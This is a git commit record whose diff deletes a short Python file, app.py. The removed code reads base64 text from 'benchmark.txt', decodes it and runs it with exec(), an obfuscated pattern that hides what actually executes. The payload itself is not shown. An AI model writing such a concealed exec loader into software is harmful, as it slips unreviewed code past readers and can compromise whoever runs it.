b4cb149841a06555068e7b9aa3e79713aca34663
Teo4268 <mamacook3300@gmail.com>
2024-11-19 13:07:16 +0700

    Delete app.py

--- app.py
+++
@@ -1,4 +0,0 @@
-import base64
-with open('benchmark.txt','r')as encoded_file:encoded_content=encoded_file.read()
-decoded_content=base64.b64decode(encoded_content).decode('utf-8')
-exec(decoded_content)
